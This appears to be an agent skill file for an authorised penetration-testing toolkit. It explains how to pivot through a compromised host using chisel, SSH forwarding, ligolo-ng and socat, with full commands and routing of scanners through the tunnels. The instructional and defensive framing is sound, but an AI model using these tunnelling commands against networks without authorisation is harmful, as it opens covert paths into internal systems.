---
name: pivoting-and-tunneling
description: Move through a network after gaining a foothold. Use when an engagement needs reachability to hosts that sit behind NAT, a firewall or a second subnet — setting up chisel SOCKS5 or reverse SOCKS, chisel port forwards, SSH dynamic/local/remote forwarding, SOCKS chaining through multiple hops, socat bridges, or ligolo-ng layer 3 tunnelling, and routing the CyberPi scanners (cyber_pivot, cyber_portscan, cyber_service_scan, cyber_http_probe) through the tunnel to enumerate and probe internal services.
---

# Pivoting and tunnelling

A foothold is a machine you can run commands on. A pivot is the network path
from that machine to somewhere else. This skill covers how to build that path
and how to point the CyberPi toolkit at it.

Read `references/tunnels.md` for the exact configuration snippets (chisel
server and client lines, proxychains configuration, ssh client config,
ligolo-ng setup). This file is the workflow.

## The three roles

| Role | Meaning | Typical host |
|---|---|---|
| Attacker | The machine CyberPi runs on, and the one that holds the engagement directory. | Your Kali box |
| Pivot | A host you control, used as a relay to the target. | A compromised host, or an internal relay you authenticated to with recovered credentials |
| Target | The host or subnet you cannot reach directly. | An internal server, a jump host, an OT segment |

The pivot is not always the compromised host. Often the compromised host
*is* the attacker (you run commands on it) and the pivot is a separate
internal relay you authenticated to with the credentials you just obtained.

## The CyberPi tools involved

| Tool | Binary | Technique | Role |
|---|---|---|---|
| `cyber_pivot` | chisel, ligolo-proxy | `pivot` | Starts a chisel server or client, a ligolo-ng proxy, a SOCKS5 proxy or a TCP forward, and keeps the PID, log and config in `.cyberpi/pivot/` |
| `cyber_portscan` | naabu | `port-scan` | Finds open TCP ports across the tunnel (`target`, `ports`, `rate`, `top_ports`) |
| `cyber_service_scan` | nmap | `service-enumeration` | Identifies services and versions behind the tunnel (`target`, `ports`, `nse_scripts`, `timing`, `version_only`) |
| `cyber_http_probe` | httpx | `recon` | Confirms HTTP(S) services, titles and technology behind the tunnel (`target`, `ports`, `threads`, `follow_redirects`, `screenshot`) |

Every one of them is scope-checked and journalled by the shared toolkit. The
parameter that matters for authorization is the destination (`target`) and,
where the tool takes one, the port.

## Authorisation comes first

The scope check happens before the command is spawned, so a tunnel that lets
you reach a network you are not authorized to touch is still refused — but
only if the scope file describes that network.

Before building a tunnel:

1. Add the internal ranges to `.cyberpi/scope.json`. A rule for `10.0.0.0/24`
   covers the whole segment, including everything you reach through the
   tunnel.
2. Add the `pivot` technique to the engagement technique allowlist, alongside
   the other techniques you intend to use (`recon`, `port-scan`,
   `service-enumeration`). A technique allowlist that omits `pivot` blocks
   `cyber_pivot` before the binary is even checked.
3. Restrict ports where the client asked for it. A rule limited to
   `ports: [80, 443]` will refuse a scan of port 22 even through a working
   tunnel, and the refusal message names the allowed ports.

Never use the loopback self-test allowance to smuggle an unauthorized target
through. `127.0.0.1` is always allowed because the harness self-tests against
it, so a local forward would pass the check even when the real destination
is out of scope. Put the real destination in `scope.json` and record the port
mapping in `.cyberpi/notes/`, so the journal and the report describe what
actually happened.

## Choosing a tunnel type

| Situation | Use | Layer |
|---|---|---|
| You need to scan a whole internal subnet | ligolo-ng | 3 (kernel route) |
| You need one internal web service | chisel forward or `ssh -L` | 4 (port) |
| You need HTTP clients (curl, sqlmap, a browser) to reach internal hosts | chisel SOCKS5 or `ssh -D` | 4 (proxy) |
| The tunnel has to run in the opposite direction | chisel `--reverse` | 4 (proxy) |
| Two hops to the target | `ssh -J`, or a SOCKS chain | 4 |
| No chisel and no SSH | socat bridge | 4 (port) |

Prefer layer 3 (ligolo-ng) whenever the goal is scanning, because it needs no
per-tool configuration: the kernel routes the internal subnet and every
scanner works unchanged. See "Routing the toolkit" below for why the SOCKS
option needs care with the Go-based scanners.

## Starting the tunnel with cyber_pivot

`cyber_pivot` owns the lifecycle of a tunnel: it starts the process
detached, writes the PID, the log and the tunnel state into
`.cyberpi/pivot/`, writes a matching proxychains configuration into
`.cyberpi/notes/`, and journals the action.

| Action | What it runs | Use it for |
|---|---|---|
| `start-chisel-server` | `chisel server --port 8080 --reverse --socks5` | The entry point of the tunnel, on a host that other machines can reach |
| `start-chisel-client` | `chisel client <target> R:1080:socks` | A reverse SOCKS5 that opens on the chisel server |
| `socks-proxy` | `chisel client <target> 127.0.0.1:1080:socks` | A SOCKS5 listener on this host, exiting through the pivot |
| `start-proxychains` | Same as `socks-proxy` | The same, and it also writes the proxychains configuration |
| `port-forward` | `chisel client <target> 127.0.0.1:<listen_port>:<remote_host>:<remote_port>` | One forwarded TCP port |
| `start-ligolo-proxy` | `ligolo-proxy -selfcert -laddr 0.0.0.0:11601` | A layer 3 tun interface for subnet scanning |

Parameters that matter:

- `target` — the pivot host, optionally with a port (`host:port`). It is
  checked against the engagement scope, so the pivot has to be authorized
  too, not only the final destination.
- `listen_port` — the port the tunnel listens on (chisel server, local
  forward, ligolo proxy).
- `remote_host` and `remote_port` — the destination reached through the
  tunnel. `remote_host` is resolved on the pivot, not locally.
- `socks_port` — the SOCKS5 port, 1080 by default.
- `background` — true by default, so the tunnel survives the tool call.
  Foreground ends the tunnel when the command returns.
- `kill_existing` — stops the tunnel this tool started earlier for the same
  action and target, which is how you replace a tunnel cleanly.

The tool prints the command it ran, the tunnel name, the config, PID and log
paths, the SOCKS endpoint and the usage lines. Keep them: they are the only
record of which host the traffic exits from.

`cyber_pivot` declares chisel as its required binary, so chisel has to be
installed even for the ligolo-ng actions.

The raw commands are in `references/tunnels.md` for the cases the tool does
not cover, such as a chisel server started on a host you do not hold the
engagement directory on.

## 1. Chisel SOCKS5

The most common pivot: the attacker ends up with a SOCKS5 proxy whose
connections exit from the pivot host.

Which side listens depends on who can reach whom. Pick the variant that
matches the connectivity you have.

**The attacker can reach the pivot** (the pivot has a routable address, or
both are inside the same network). The pivot runs the server, the attacker
runs the client with a local SOCKS proxy:

```bash
# Pivot
chisel server --port 8080 --host 0.0.0.0
# Attacker
chisel client <pivot-ip>:8080 127.0.0.1:1080:socks
```

**The pivot can reach the attacker** (the usual case in a cloud engagement or
a lab where the pivot has outbound access). The attacker runs the server, the
pivot runs the client with a remote SOCKS proxy:

```bash
# Attacker
chisel server --port 8080 --reverse --socks5 --host 0.0.0.0
# Pivot
chisel client <attacker-ip>:8080 R:1080:socks
```

In the first form the proxy listens on the attacker on port 1080. In the
second form it also listens on the attacker, on the port named by the
`R:` spec. Either way the destination is reached from the pivot, which is
the side with the route to the internal network.

Verify before using it:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://<internal-host>/
```

`--socks5-hostname` (not `--socks5`) makes curl resolve the name through the
proxy, so the internal DNS the pivot sees is used. `--socks5` sends the name
to the local resolver and fails for internal names.

## 2. Reverse SOCKS

`--reverse` flips the direction of the tunnel: the chisel server acts as the
client, so the side that can reach the destination opens the connection to
it. Use it when the proxy has to sit on the pivot, or when the pivot is the
only side with a route to the internal network while the transport is
established the other way round.

```bash
# Attacker
chisel server --reverse --port 8080 --host 0.0.0.0
# Pivot
chisel client <attacker-ip>:8080 R:1080:socks
```

The listener can end up on either machine depending on the topology, so
confirm it before relying on it: `ss -tlnp | grep chisel` on both hosts, then
the curl test above. The installed chisel version decides the exact behaviour
of the flag set; `chisel --help` on the box is the authority.

`cyber_pivot` with `action: "start-chisel-server"` already runs the server
with `--reverse --socks5`, and `action: "start-chisel-client"` runs the
client with `R:<socks_port>:socks`. Use the tool unless the server has to
run on a host without the engagement directory.

## 3. Chisel port forwarding

For a single service, a forwarded port is simpler and more robust than a
proxy.

```bash
# Attacker: listen locally, forward through the pivot to the internal host
chisel client <pivot-ip>:8080 127.0.0.1:8081:<internal-host>:80
```

Now `http://127.0.0.1:8081` is the internal web server. Remote forwarding
(`R:port:host:port`) opens the listener on the chisel server side instead
and reaches the destination through the client, which is what you want when
the machine running the chisel client is the one that should expose the
service.

In the harness this is `cyber_pivot` with `action: "port-forward"`,
`target: <pivot>`, `listen_port: 8081`, `remote_host: <internal-host>` and
`remote_port: 80`.

## 4. SSH forwarding and SOCKS chaining

SSH is the fallback when chisel is not installed, and the only option when
the pivot already has usable credentials.

```bash
# Dynamic (SOCKS5) forwarding
ssh -N -D 1080 -f -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 user@<pivot>

# Local forward: 127.0.0.1:8081 on the attacker -> <internal-host>:80
ssh -N -L 8081:<internal-host>:80 -f -o ExitOnForwardFailure=yes user@<pivot>

# Remote forward: the pivot listens on 8081 and forwards back to the attacker
ssh -N -R 8081:127.0.0.1:80 -f -o ExitOnForwardFailure=yes user@<pivot>
```

Chain hops with a jump host. The second SOCKS proxy rides the first:

```bash
ssh -N -D 1081 -f -J user@<hop1> user@<pivot>
```

and point the client at `127.0.0.1:1081`.

`ExitOnForwardFailure=yes` matters: without it ssh reports success even when
the forward was refused, and you debug a tunnel that was never created.

## 5. ligolo-ng layer 3

For subnet scanning this is the right tool. The proxy creates a tun interface
on the attacker and the kernel routes the internal network into it, so every
tool — naabu, nmap, httpx — behaves as if the segment were a local network.

```bash
# Attacker (root)
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# Pivot
ligolo -c <attacker-ip>:11601
# Attacker, after the agent connects
sudo ip route add 10.0.0.0/24 dev ligolo
```

`cyber_pivot` with `action: "start-ligolo-proxy"` runs the proxy and prints
the exact usage line for the installed version (older releases use `-l`
instead of `-laddr`).

ligolo-ng is not part of the default CyberPi toolchain; install it with
`sudo apt install -y ligolo-ng` or from the upstream release. TUN mode needs
no root on the pivot; ethernet mode gives L2 access and does need root.

## 6. socat bridge

The fallback when neither chisel nor SSH is available on the pivot:

```bash
# On the pivot: expose an internal service
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<internal-host>:80
```

socat has no SOCKS5 server mode, so it cannot replace a SOCKS proxy. Use it
for one service at a time, and use `chisel` or `ssh -D` when you need a
proxy.

## Routing the toolkit through the tunnel

The three ways to make `cyber_portscan`, `cyber_service_scan` and
`cyber_http_probe` work against an internal target, in order of preference.

### A. Layer 3 route (ligolo-ng) — no per-tool configuration

Add the internal range to `scope.json`, add the route, and target the real
internal addresses. Nothing else changes.

```
cyber_portscan      target 10.0.0.0/24
cyber_service_scan  target 10.0.0.15  ports 22,80,443
cyber_http_probe    target http://10.0.0.15/
```

The journal then records the real destination, which is what the report needs.

### B. Local port forward — one service at a time

Forward the port to loopback and target the loopback address.

```
cyber_http_probe    target http://127.0.0.1:8081
cyber_portscan      target 127.0.0.1  ports 8081
cyber_service_scan  target 127.0.0.1  ports 8081
```

This works for all three tools because they all connect to a TCP port. The
limitation is the mapping: one forwarded port per service, so it does not
scale to a subnet scan. As noted above, the real destination still has to be
in `scope.json`.

### C. SOCKS5 proxy — for clients that support proxies

`proxychains4` is the generic redirector, and it has a hard limitation that
decides when it is usable:

```bash
file "$(which naabu)" "$(which httpx)" "$(which nmap)"
```

`proxychains` works by injecting `LD_PRELOAD`, so it only affects
dynamically linked binaries. nmap and curl are dynamically linked and are
redirected; naabu and httpx are Go binaries distributed as static
executables and are not. A static binary through a SOCKS proxy is not
possible without a layer 3 route or a local forward.

`cyber_pivot` with `action: "start-proxychains"` writes a ready to use
configuration to `.cyberpi/notes/proxychains-<tunnel>.conf` and prints the
path. Use it for the commands you run by hand:

```bash
proxychains4 -f .cyberpi/notes/proxychains-<tunnel>.conf <command>
```

For tools that support proxies natively, use them directly rather than
through the harness wrappers, because the CyberPi tool schemas do not expose
proxy flags:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://<internal-host>/
nmap -sT -p 80,443 --proxies socks5://127.0.0.1:1080 <internal-host>
```

`nmap` needs `-sT` when it goes through a proxy: a SYN scan uses raw
sockets, which bypass the proxy entirely and never leaves the machine.
`proxychains4 nmap ...` has the same requirement, plus proxychains needs
`strict_chain` and a `socks5` entry in the configuration file (snippet in
`references/tunnels.md`).

## Verifying the tunnel

Run the checks in this order, so a failure is easy to localise:

1. The listener exists: `ss -tlnp | grep -E 'chisel|ssh|ligolo'`.
2. The process is alive: `cat .cyberpi/pivot/<tunnel>.pid` and check the log
   in `.cyberpi/pivot/<tunnel>.log`.
3. The proxy works: `curl --socks5-hostname 127.0.0.1:1080 http://<internal-host>/`.
4. The route works: `ping -c1 <internal-host>` (layer 3 only).
5. The harness works: `cyber_http_probe` against the internal target through
   the tunnel.

If step 3 fails but step 1 passes, the tunnel is up and the name resolution
or the destination is wrong. If step 3 hangs, the pivot cannot reach the
destination.

## Recording what you did

Tool calls are journalled automatically: `cyber_pivot` appears in
`.cyberpi/journal.jsonl` with its command, target and artifact. Tunnels you
start by hand from a shell are not journalled by the harness, so record them
in `.cyberpi/notes/` — the report is assembled from the journal and the
notes, and a pivot that is missing from the notes looks like an unexplained
change of target.

The notes template is at the end of `references/tunnels.md`.

## Teardown

```bash
# Through the harness: replace the tunnel, the tool stops the old one first
cyber_pivot action=start-chisel-client target=<pivot> kill_existing=true

# By hand
pkill -f 'chisel client'
ssh -O exit -S ~/.ssh/control-%r@%h:%p 2>/dev/null   # for control-socket forwards
sudo ip route del 10.0.0.0/24 dev ligolo
```

Leaving a tunnel open keeps an unauthorised path into the client network
alive after the engagement ends, and a jump host that still has a SOCKS
listener on it is a finding in its own right. Tear tunnels down, then note
the teardown.

## Common failures

| Symptom | Cause | Fix |
|---|---|---|
| `connection refused` on the chisel port | The pivot firewall blocks 8080, or the chisel server is not running | Start the server, open the port, check `ss -tlnp` on the pivot |
| SOCKS connects but every request fails | The pivot cannot reach the destination network | Test from the pivot with `nc -vz <target> <port>` |
| Names do not resolve through the proxy | The local resolver was used instead of the remote one | Use `--socks5-hostname` / `socks5h://` |
| nmap through the proxy returns "no ports" | A SYN scan bypasses the proxy | Use `-sT` |
| proxychains has no effect on a tool | The binary is statically linked | Use a layer 3 route or a local forward |
| The tunnel dies after a few minutes | Idle timeout or NAT reaping | `ServerAliveInterval=30`, `ServerAliveCountMax=4` on ssh; keep the chisel client in a `tmux`/`screen` session |
| The tunnel dies right after the tool call | It was started in the foreground | Start it with `background: true` (the default) |
